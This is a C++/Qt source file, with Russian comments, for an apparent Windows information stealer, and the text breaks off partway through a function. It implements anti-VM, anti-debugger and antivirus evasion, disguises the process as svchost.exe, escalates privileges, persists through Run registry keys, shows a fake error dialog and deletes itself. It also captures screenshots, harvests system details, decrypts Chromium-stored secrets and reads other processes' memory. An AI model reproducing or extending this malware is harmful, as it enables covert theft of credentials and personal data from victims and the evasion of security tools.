#include <windows.h>
#include <ntstatus.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <regex>
#include <gdiplus.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <wininet.h>
#include <psapi.h>
#include <shlobj.h>
#include <sqlite3.h>
#include <wincrypt.h>
#include <urlmon.h>
#include <filesystem>
#include <random>
#include <time.h>
#include <zip.h>
#include <QApplication>
#include <QMainWindow>
#include <QThread>
#include <QNetworkAccessManager>
#include <QNetworkRequest>
#include <QNetworkReply>
#include <QHttpMultiPart>
#include <QFile>
#include <QFileDialog>
#include <QMessageBox>
#include <QSettings>
#include <mutex>
#include <thread>
#include <memoryapi.h>
#include <bcrypt.h>

#include "mainwindow.h"
#include "build_key.h"
#include "polymorphic_code.h"
#include "junk_code.h"
#include "stealerworker.h"

// Определение NT_SUCCESS, если он отсутствует
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// Переопределение типов для совместимости
typedef enum _THREADINFOCLASS {
    ThreadBasicInformation = 0,
    ThreadQuerySetWin32StartAddress = 9
} THREADINFOCLASS;

typedef struct _THREAD_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PVOID TebBaseAddress;
    ULONG_PTR ClientId;
    ULONG_PTR AffinityMask;
    LONG Priority;
    LONG BasePriority;
} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;

// Глобальные переменные
std::mutex g_mutex;
MainWindow* g_mainWindow = nullptr;
Gdiplus::GdiplusStartupInput gdiplusStartupInput;
ULONG_PTR gdiplusToken;

// Функция для логирования с потокобезопасностью
void Log(const QString& message) {
    std::lock_guard<std::mutex> lock(g_mutex);
    if (g_mainWindow) {
        g_mainWindow->emitLog(message);
    }
    std::cout << message.toStdString() << std::endl;
}

// Генерация IV с использованием криптографически безопасного RNG
std::array<unsigned char, 16> GenerateIV() {
    std::array<unsigned char, 16> iv;
    BCRYPT_ALG_HANDLE hRng;
    NTSTATUS status = BCryptOpenAlgorithmProvider(&hRng, BCRYPT_RNG_ALGORITHM, nullptr, 0);
    if (BCRYPT_SUCCESS(status)) {
        status = BCryptGenRandom(hRng, iv.data(), iv.size(), 0);
        BCryptCloseAlgorithmProvider(hRng, 0);
        if (!BCRYPT_SUCCESS(status)) {
            Log("Failed to generate IV: " + QString::number(status));
        }
    } else {
        Log("Failed to open RNG provider: " + QString::number(status));
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 255);
        for (auto& byte : iv) {
            byte = static_cast<unsigned char>(dis(gen));
        }
    }
    return iv;
}

// Получение ключа из строки с дополнением до нужной длины
std::array<unsigned char, 16> GetStaticEncryptionKey(const std::string& key) {
    std::array<unsigned char, 16> result = {};
    if (key.empty()) return result;
    size_t len = std::min(key.size(), result.size());
    std::copy(key.begin(), key.begin() + len, result.begin());
    if (len < result.size()) {
        // Дополняем ключ нулями или повторяем его, если он короче
        for (size_t i = len; i < result.size(); ++i) {
            result[i] = result[i % len];
        }
    }
    return result;
}

// Шифрование данных с улучшенной обработкой ошибок
std::string EncryptData(const std::string& data, const std::string& key1, const std::string& key2, const std::string& salt) {
    if (data.empty() || key1.empty() || key2.empty() || salt.empty()) {
        throw std::runtime_error("Encryption parameters cannot be empty");
    }

    std::array<unsigned char, 16> encryptionKey1 = GetStaticEncryptionKey(key1);
    std::array<unsigned char, 16> encryptionKey2 = GetStaticEncryptionKey(key2);
    std::array<unsigned char, 16> iv = GenerateIV();

    std::vector<unsigned char> combinedKey(32);
    std::copy(encryptionKey1.begin(), encryptionKey1.end(), combinedKey.begin());
    std::copy(encryptionKey2.begin(), encryptionKey2.end(), combinedKey.begin() + 16);

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!BCRYPT_SUCCESS(status)) {
        throw std::runtime_error("Failed to open AES algorithm provider: " + std::to_string(status));
    }

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        throw std::runtime_error("Failed to set chaining mode: " + std::to_string(status));
    }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, combinedKey.data(), combinedKey.size(), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        throw std::runtime_error("Failed to generate symmetric key: " + std::to_string(status));
    }

    DWORD cbData = 0, cbResult = 0;
    status = BCryptEncrypt(hKey, (PUCHAR)data.data(), data.size(), nullptr, iv.data(), iv.size(), nullptr, 0, &cbData, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        throw std::runtime_error("Failed to calculate encrypted data size: " + std::to_string(status));
    }

    std::vector<BYTE> encryptedData(cbData);
    status = BCryptEncrypt(hKey, (PUCHAR)data.data(), data.size(), nullptr, iv.data(), iv.size(), encryptedData.data(), cbData, &cbResult, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        throw std::runtime_error("Failed to encrypt data: " + std::to_string(status));
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    std::vector<BYTE> finalData(iv.size() + cbResult);
    std::copy(iv.begin(), iv.end(), finalData.begin());
    std::copy(encryptedData.begin(), encryptedData.begin() + cbResult, finalData.begin() + iv.size());

    DWORD base64Size = 0;
    if (!CryptBinaryToStringA(finalData.data(), finalData.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, nullptr, &base64Size)) {
        throw std::runtime_error("Failed to calculate Base64 size: " + std::to_string(GetLastError()));
    }
    std::vector<char> base64Data(base64Size);
    if (!CryptBinaryToStringA(finalData.data(), finalData.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64Data.data(), &base64Size)) {
        throw std::runtime_error("Failed to convert to Base64: " + std::to_string(GetLastError()));
    }

    return std::string(base64Data.data(), base64Size - 1);
}

// Дешифрование данных с исправлением ошибок
std::string DecryptData(const std::string& encryptedData) {
    if (encryptedData.empty() || !g_mainWindow) {
        Log("Encrypted data or MainWindow is null");
        return "";
    }

    std::string key1 = g_mainWindow->encryptionKey1;
    std::string key2 = g_mainWindow->encryptionKey2;
    std::string salt = g_mainWindow->encryptionSalt;

    if (key1.empty() || key2.empty() || salt.empty()) {
        Log("Decryption keys or salt are empty");
        return "";
    }

    DWORD binarySize = 0;
    if (!CryptStringToBinaryA(encryptedData.c_str(), encryptedData.size(), CRYPT_STRING_BASE64, nullptr, &binarySize, nullptr, nullptr)) {
        Log("Failed to calculate binary size for decryption: " + QString::number(GetLastError()));
        return "";
    }
    std::vector<BYTE> binaryData(binarySize);
    if (!CryptStringToBinaryA(encryptedData.c_str(), encryptedData.size(), CRYPT_STRING_BASE64, binaryData.data(), &binarySize, nullptr, nullptr)) {
        Log("Failed to convert Base64 to binary: " + QString::number(GetLastError()));
        return "";
    }

    if (binarySize < 16) {
        Log("Encrypted data too short to contain IV");
        return "";
    }
    std::array<unsigned char, 16> iv;
    std::copy(binaryData.begin(), binaryData.begin() + 16, iv.begin());

    std::vector<BYTE> encryptedContent(binaryData.begin() + 16, binaryData.end());
    DWORD encryptedSize = binarySize - 16;

    std::array<unsigned char, 16> encryptionKey1 = GetStaticEncryptionKey(key1);
    std::array<unsigned char, 16> encryptionKey2 = GetStaticEncryptionKey(key2);

    std::vector<unsigned char> combinedKey(32);
    std::copy(encryptionKey1.begin(), encryptionKey1.end(), combinedKey.begin());
    std::copy(encryptionKey2.begin(), encryptionKey2.end(), combinedKey.begin() + 16);

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!BCRYPT_SUCCESS(status)) {
        Log("Failed to open AES algorithm provider for decryption: " + QString::number(status));
        return "";
    }

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        Log("Failed to set chaining mode for decryption: " + QString::number(status));
        return "";
    }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, combinedKey.data(), combinedKey.size(), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        Log("Failed to generate symmetric key for decryption: " + QString::number(status));
        return "";
    }

    DWORD cbData = 0, cbResult = 0;
    status = BCryptDecrypt(hKey, encryptedContent.data(), encryptedSize, nullptr, iv.data(), iv.size(), nullptr, 0, &cbData, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        Log("Failed to calculate decrypted data size: " + QString::number(status));
        return "";
    }

    std::vector<BYTE> decryptedData(cbData);
    status = BCryptDecrypt(hKey, encryptedContent.data(), encryptedSize, nullptr, iv.data(), iv.size(), decryptedData.data(), cbData, &cbResult, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        Log("Failed to decrypt data: " + QString::number(status));
        return "";
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return std::string(reinterpret_cast<char*>(decryptedData.data()), cbResult);
}

// Проверка на виртуальную машину с расширенной логикой
bool CheckVirtualEnvironment() {
    bool isVM = false;

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char value[256] = {0};
        DWORD size = sizeof(value);
        if (RegQueryValueExA(hKey, "Identifier", nullptr, nullptr, (LPBYTE)value, &size) == ERROR_SUCCESS) {
            std::string identifier(value);
            std::vector<std::string> vmSignatures = {"VBOX", "VMWARE", "QEMU", "VIRTUAL", "KVM", "XEN"};
            for (const auto& sig : vmSignatures) {
                if (identifier.find(sig) != std::string::npos) {
                    Log("VM detected via SCSI identifier: " + QString::fromStdString(identifier));
                    isVM = true;
                    break;
                }
            }
        }
        RegCloseKey(hKey);
    }

    std::vector<std::string> sandboxDlls = {"SbieDll.dll", "dbghelp.dll", "snxhk.dll"};
    for (const auto& dll : sandboxDlls) {
        if (GetModuleHandleA(dll.c_str())) {
            Log("Sandbox or debugger detected (" + QString::fromStdString(dll) + ")");
            isVM = true;
        }
    }

    SYSTEM_INFO sysInfo{};
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors <= 2) {
        Log("Low processor count detected: " + QString::number(sysInfo.dwNumberOfProcessors));
        isVM = true;
    }

    MEMORYSTATUSEX memStatus{};
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);
    if (memStatus.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) {
        Log("Low memory detected: " + QString::number(memStatus.ullTotalPhys / (1024 * 1024)) + " MB");
        isVM = true;
    }

    LARGE_INTEGER freq{}, start{}, end{};
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    for (volatile int i = 0; i < 100000; i++);
    QueryPerformanceCounter(&end);
    double elapsed = (end.QuadPart - start.QuadPart) * 1000.0 / freq.QuadPart;
    if (elapsed > 50) {
        Log("Suspicious execution time detected: " + QString::number(elapsed) + " ms");
        isVM = true;
    }

    ULONG bufferSize = 15000;
    std::vector<char> buffer(bufferSize);
    PIP_ADAPTER_INFO adapterInfo = reinterpret_cast<PIP_ADAPTER_INFO>(buffer.data());
    if (GetAdaptersInfo(adapterInfo, &bufferSize) == NO_ERROR) {
        for (PIP_ADAPTER_INFO adapter = adapterInfo; adapter; adapter = adapter->Next) {
            std::string mac;
            for (unsigned int i = 0; i < adapter->AddressLength; i++) {
                char macByte[3];
                sprintf_s(macByte, "%02X", adapter->Address[i]);
                mac += macByte;
                if (i < adapter->AddressLength - 1) mac += "-";
            }
            std::vector<std::string> vmMacPrefixes = {"00-50-56", "00-0C-29", "00-1C-14", "00-05-69", "08-00-27"};
            for (const auto& prefix : vmMacPrefixes) {
                if (mac.find(prefix) != std::string::npos) {
                    Log("VM MAC address detected: " + QString::fromStdString(mac));
                    isVM = true;
                    break;
                }
            }
        }
    }

    std::vector<std::string> vmDrivers = {"VBoxDrv.sys", "vmci.sys", "vmhgfs.sys", "vmmemctl.sys", "prl_fs.sys"};
    for (const auto& driver : vmDrivers) {
        std::string driverPath = "C:\\Windows\\System32\\drivers\\" + driver;
        if (std::filesystem::exists(driverPath)) {
            Log("VM driver detected: " + QString::fromStdString(driver));
            isVM = true;
        }
    }

    return isVM;
}

// Проверка на отладчик или антивирус с улучшенной логикой
bool CheckDebuggerOrAntivirus() {
    if (IsDebuggerPresent()) {
        Log("Debugger detected via IsDebuggerPresent");
        return true;
    }

    typedef NTSTATUS(NTAPI *pNtQueryInformationThread)(HANDLE, THREADINFOCLASS, PVOID, ULONG, PULONG);
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        Log("Failed to load ntdll.dll for NtQueryInformationThread");
        return false;
    }

    pNtQueryInformationThread NtQueryInformationThread = reinterpret_cast<pNtQueryInformationThread>(
        GetProcAddress(hNtdll, "NtQueryInformationThread"));
    if (NtQueryInformationThread) {
        THREAD_BASIC_INFORMATION tbi{};
        NTSTATUS status = NtQueryInformationThread(GetCurrentThread(), ThreadBasicInformation, &tbi, sizeof(tbi), nullptr);
        if (NT_SUCCESS(status) && tbi.TebBaseAddress) {
            DWORD debugPort = 0;
            status = NtQueryInformationThread(GetCurrentThread(), ThreadQuerySetWin32StartAddress, &debugPort, sizeof(debugPort), nullptr);
            if (NT_SUCCESS(status) && debugPort != 0) {
                Log("Debugger detected via NtQueryInformationThread");
                return true;
            }
        }
    }

    std::vector<std::string> avProcesses = {
        "avp.exe", "MsMpEng.exe", "avgui.exe", "egui.exe", "McTray.exe",
        "norton.exe", "avastui.exe", "kav.exe", "wireshark.exe", "ollydbg.exe",
        "procmon.exe", "idaq.exe", "x64dbg.exe"
    };
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        Log("Failed to create process snapshot for AV check");
        return false;
    }

    PROCESSENTRY32W pe32{};
    pe32.dwSize = sizeof(pe32);
    bool avDetected = false;
    if (Process32FirstW(hProcessSnap, &pe32)) {
        do {
            std::wstring processName(pe32.szExeFile);
            for (const auto& av : avProcesses) {
                std::wstring wAv(av.begin(), av.end());
                if (_wcsicmp(processName.c_str(), wAv.c_str()) == 0) {
                    Log("Antivirus or analysis tool detected: " + QString::fromStdWString(processName));
                    avDetected = true;
                    break;
                }
            }
        } while (Process32NextW(hProcessSnap, &pe32) && !avDetected);
    }
    CloseHandle(hProcessSnap);
    return avDetected;
}

// Антианализ с дополнительными проверками
bool MainWindow::AntiAnalysis() {
    if (!config.antiVM) return false;

    if (CheckVirtualEnvironment()) {
        Log("Virtual machine detected, exiting");
        return true;
    }

    if (CheckDebuggerOrAntivirus()) {
        Log("Debugger or Antivirus detected, exiting");
        return true;
    }

    LARGE_INTEGER freq{}, start{}, end{};
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    for (volatile int i = 0; i < 1000000; i++);
    QueryPerformanceCounter(&end);
    double elapsed = (end.QuadPart - start.QuadPart) * 1000.0 / freq.QuadPart;
    if (elapsed > 100) {
        Log("Suspicious execution time detected: " + QString::number(elapsed) + " ms, exiting");
        return true;
    }

    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hThreadSnap != INVALID_HANDLE_VALUE) {
        THREADENTRY32 te32{};
        te32.dwSize = sizeof(te32);
        int threadCount = 0;
        if (Thread32First(hThreadSnap, &te32)) {
            do {
                if (te32.th32OwnerProcessID == GetCurrentProcessId()) threadCount++;
            } while (Thread32Next(hThreadSnap, &te32));
        }
        CloseHandle(hThreadSnap);
        if (threadCount > 50) {
            Log("Too many threads detected: " + QString::number(threadCount) + ", exiting");
            return true;
        }
    }

    char processName[MAX_PATH] = {0};
    GetModuleFileNameA(nullptr, processName, MAX_PATH);
    std::string procName = std::filesystem::path(processName).filename().string();
    std::vector<std::string> suspiciousNames = {"analyzer", "sandbox", "debug", "trace"};
    for (const auto& name : suspiciousNames) {
        if (procName.find(name) != std::string::npos) {
            Log("Suspicious process name detected: " + QString::fromStdString(procName) + ", exiting");
            return true;
        }
    }

    return false;
}

// Маскировка процесса с улучшенной совместимостью
void MaskProcess() {
    HANDLE hProcess = GetCurrentProcess();
    SetPriorityClass(hProcess, HIGH_PRIORITY_CLASS);

    wchar_t systemPath[MAX_PATH] = {0};
    if (GetSystemDirectoryW(systemPath, MAX_PATH)) {
        wcscat_s(systemPath, L"\\svchost.exe");
        SetFileAttributesW(systemPath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
    } else {
        Log("Failed to get system directory for process masking");
    }

    typedef NTSTATUS(NTAPI *pNtSetInformationProcess)(HANDLE, DWORD, PVOID, ULONG);
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        pNtSetInformationProcess NtSetInformationProcess = reinterpret_cast<pNtSetInformationProcess>(
            GetProcAddress(hNtdll, "NtSetInformationProcess"));
        if (NtSetInformationProcess) {
            wchar_t fakeName[] = L"svchost.exe";
            NTSTATUS status = NtSetInformationProcess(hProcess, 0x1C, fakeName, sizeof(fakeName));
            if (NT_SUCCESS(status)) {
                Log("Process masked as svchost.exe");
            } else {
                Log("Failed to mask process: " + QString::number(status));
            }
        }
    }
}

// Повышение привилегий и скрытие
void MainWindow::Stealth() {
    if (!config.silent) return;

    char path[MAX_PATH] = {0};
    GetModuleFileNameA(nullptr, path, MAX_PATH);
    SetFileAttributesA(path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    MaskProcess();

    HANDLE hToken = nullptr;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        TOKEN_PRIVILEGES tp{};
        tp.PrivilegeCount = 1;
        if (LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &tp.Privileges[0].Luid)) {
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr) && GetLastError() == ERROR_SUCCESS) {
                Log("Privileges elevated");
            } else {
                Log("Failed to adjust privileges: " + QString::number(GetLastError()));
            }
        }
        CloseHandle(hToken);
    } else {
        Log("Failed to open process token: " + QString::number(GetLastError()));
    }
}

// Добавление в автозапуск
void AddToStartup() {
    if (!g_mainWindow || !g_mainWindow->config.autoStart) return;

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        char path[MAX_PATH] = {0};
        GetModuleFileNameA(nullptr, path, MAX_PATH);
        if (RegSetValueExA(hKey, "SystemUpdate", 0, REG_SZ, (BYTE*)path, strlen(path) + 1) == ERROR_SUCCESS) {
            Log("Added to startup (HKEY_CURRENT_USER)");
        } else {
            Log("Failed to set registry value for startup: " + QString::number(GetLastError()));
        }
        RegCloseKey(hKey);
    } else {
        Log("Failed to open registry key for startup: " + QString::number(GetLastError()));
    }
}

// Обеспечение персистентности
void MainWindow::Persist() {
    if (!config.persist) return;

    AddToStartup();
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, nullptr, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr, &hKey, nullptr) == ERROR_SUCCESS) {
        char path[MAX_PATH] = {0};
        GetModuleFileNameA(nullptr, path, MAX_PATH);
        if (RegSetValueExA(hKey, "SystemService", 0, REG_SZ, (BYTE*)path, strlen(path) + 1) == ERROR_SUCCESS) {
            Log("Persisted in HKEY_LOCAL_MACHINE");
        } else {
            Log("Failed to set registry value in HKEY_LOCAL_MACHINE: " + QString::number(GetLastError()));
        }
        RegCloseKey(hKey);
    } else {
        Log("Failed to create registry key in HKEY_LOCAL_MACHINE: " + QString::number(GetLastError()));
    }
}

// Отображение фейковой ошибки
void MainWindow::FakeError() {
    if (!config.fakeError) return;

    MessageBoxA(nullptr, "System Error: Critical process has stopped working.", "System Error", MB_ICONERROR | MB_OK);
    Log("Displayed fake error message");
}

// Самоуничтожение с улучшенной надежностью
void MainWindow::SelfDestruct() {
    if (!config.selfDestruct) return;

    char path[MAX_PATH] = {0};
    GetModuleFileNameA(nullptr, path, MAX_PATH);
    std::string batchFile = std::filesystem::temp_directory_path().string() + "\\self_destruct_" + std::to_string(GetTickCount()) + ".bat";
    std::ofstream bat(batchFile);
    if (bat.is_open()) {
        bat << "@echo off\n";
        bat << "timeout /t 2 /nobreak >nul\n";
        bat << "del /f /q \"" << path << "\"\n";
        bat << "del /f /q \"%~f0\"\n";
        bat.close();

        if (ShellExecuteA(nullptr, "open", batchFile.c_str(), nullptr, nullptr, SW_HIDE) > (HINSTANCE)32) {
            Log("Self-destruct initiated");
            ExitProcess(0);
        } else {
            Log("Failed to execute self-destruct batch: " + QString::number(GetLastError()));
        }
    } else {
        Log("Failed to create self-destruct batch file");
    }
}

// Получение версии ОС через RtlGetVersion
typedef NTSTATUS(WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
bool GetOSVersion(RTL_OSVERSIONINFOW& osInfo) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return false;

    RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");
    if (!RtlGetVersion) return false;

    osInfo.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW);
    return RtlGetVersion(&osInfo) == 0;
}

// Получение системной информации с улучшенной детализацией
std::string GetCustomSystemInfo() {
    if (!g_mainWindow || !g_mainWindow->config.systemInfo) return "";

    std::ostringstream result;

    char username[UNLEN + 1] = {0};
    DWORD usernameLen = sizeof(username);
    if (GetUserNameA(username, &usernameLen)) {
        result << "Username: " << username << "\n";
    } else {
        result << "Username: Unknown\n";
        Log("Failed to get username: " + QString::number(GetLastError()));
    }

    char computerName[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD computerNameLen = sizeof(computerName);
    if (GetComputerNameA(computerName, &computerNameLen)) {
        result << "Computer Name: " << computerName << "\n";
    } else {
        result << "Computer Name: Unknown\n";
        Log("Failed to get computer name: " + QString::number(GetLastError()));
    }

    SYSTEM_INFO sysInfo{};
    GetSystemInfo(&sysInfo);
    result << "Processor Architecture: " << sysInfo.wProcessorArchitecture << "\n";
    result << "Number of Processors: " << sysInfo.dwNumberOfProcessors << "\n";

    MEMORYSTATUSEX memInfo{};
    memInfo.dwLength = sizeof(memInfo);
    if (GlobalMemoryStatusEx(&memInfo)) {
        result << "Total Physical Memory: " << (memInfo.ullTotalPhys / (1024 * 1024)) << " MB\n";
        result << "Available Physical Memory: " << (memInfo.ullAvailPhys / (1024 * 1024)) << " MB\n";
    } else {
        result << "Memory Info: Unknown\n";
        Log("Failed to get memory info: " + QString::number(GetLastError()));
    }

    RTL_OSVERSIONINFOW osInfo{};
    if (GetOSVersion(osInfo)) {
        result << "OS Version: " << osInfo.dwMajorVersion << "." << osInfo.dwMinorVersion << "\n";
        result << "Build Number: " << osInfo.dwBuildNumber << "\n";
        if (osInfo.szCSDVersion[0]) {
            result << "Service Pack: " << std::wstring(osInfo.szCSDVersion) << "\n";
        }
    } else {
        result << "OS Info: Unknown\n";
        Log("Failed to get OS version");
    }

    ULONG bufferSize = 15000;
    std::vector<char> buffer(bufferSize);
    PIP_ADAPTER_INFO adapterInfo = reinterpret_cast<PIP_ADAPTER_INFO>(buffer.data());
    if (GetAdaptersInfo(adapterInfo, &bufferSize) == NO_ERROR) {
        for (PIP_ADAPTER_INFO adapter = adapterInfo; adapter; adapter = adapter->Next) {
            result << "Adapter Name: " << adapter->AdapterName << "\n";
            result << "Description: " << adapter->Description << "\n";
            result << "MAC Address: ";
            for (unsigned int i = 0; i < adapter->AddressLength; i++) {
                char mac[3];
                sprintf_s(mac, "%02X", adapter->Address[i]);
                result << mac;
                if (i < adapter->AddressLength - 1) result << "-";
            }
            result << "\nIP Address: " << adapter->IpAddressList.IpAddress.String << "\n";
        }
    } else {
        result << "Network Info: Unknown\n";
        Log("Failed to get network adapters info: " + QString::number(GetLastError()));
    }

    return result.str();
}

// Создание скриншота с освобождением ресурсов
std::string MainWindow::TakeScreenshot(const std::string& dir) {
    if (!config.screenshot) return "";

    HDC hScreenDC = GetDC(nullptr);
    if (!hScreenDC) {
        Log("Failed to get screen DC");
        return "";
    }

    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    if (!hMemoryDC) {
        ReleaseDC(nullptr, hScreenDC);
        Log("Failed to create memory DC");
        return "";
    }

    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    if (!hBitmap) {
        DeleteDC(hMemoryDC);
        ReleaseDC(nullptr, hScreenDC);
        Log("Failed to create bitmap");
        return "";
    }

    HGDIOBJ oldBitmap = SelectObject(hMemoryDC, hBitmap);
    if (!BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY)) {
        SelectObject(hMemoryDC, oldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(nullptr, hScreenDC);
        Log("Failed to capture screen: " + QString::number(GetLastError()));
        return "";
    }

    Gdiplus::Bitmap bitmap(hBitmap, nullptr);
    CLSID clsid;
    if (FAILED(CLSIDFromString(L"{557cf401-1a04-11d3-9a73-0000f81ef32e}", &clsid))) {
        SelectObject(hMemoryDC, oldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(nullptr, hScreenDC);
        Log("Failed to get JPEG CLSID");
        return "";
    }

    std::string screenshotName = dir + "\\screenshot_" + std::to_string(GetTickCount()) + ".jpg";
    std::wstring screenshotNameW(screenshotName.begin(), screenshotName.end());
    if (FAILED(bitmap.Save(screenshotNameW.c_str(), &clsid, nullptr))) {
        screenshotName.clear();
        Log("Failed to save screenshot: " + QString::number(GetLastError()));
    } else {
        Log("Screenshot saved: " + QString::fromStdString(screenshotName));
    }

    SelectObject(hMemoryDC, oldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(nullptr, hScreenDC);
    return screenshotName;
}

// Дешифрование данных Chromium с проверкой
std::string DecryptChromiumData(DATA_BLOB& encryptedData) {
    DATA_BLOB decryptedData{};
    if (encryptedData.cbData == 0 || !encryptedData.pbData) {
        Log("Invalid Chromium encrypted data");
        return "";
    }
    if (CryptUnprotectData(&encryptedData, nullptr, nullptr, nullptr, nullptr, 0, &decryptedData)) {
        std::string result((char*)decryptedData.pbData, decryptedData.cbData);
        LocalFree(decryptedData.pbData);
        return result;
    }
    Log("Failed to decrypt Chromium data: " + QString::number(GetLastError()));
    return "";
}

// Захват WebSocket сессий с улучшенной фильтрацией
std::string CaptureWebSocketSessions(const std::string& processName) {
    std::string result;
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        Log("Failed to create process snapshot for WebSocket capture");
        return result;
    }

    PROCESSENTRY32W pe32{};
    pe32.dwSize = sizeof(pe32);
    if (Process32FirstW(hProcessSnap, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, std::wstring(processName.begin(), processName.end()).c_str()) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    char buffer[4096] = {0};
                    SIZE_T bytesRead = 0;
                    MEMORY_BASIC_INFORMATION mbi{};
                    LPVOID address = 0;
                    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
                        if (mbi.State == MEM_COMMIT && (mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_READONLY)) {
                            if (ReadProcessMemory(hProcess, address, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
                                std::string memoryData(buffer, bytesRead);
                                std::regex wsRegex("wss?://[^\\s]+");
                                std::smatch match;
                                std::string::const_iterator searchStart(memoryData.cbegin());
                                while (std::regex_search(searchStart, memoryData.cend(), match, wsRegex)) {
                                    result += "WebSocket URL: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
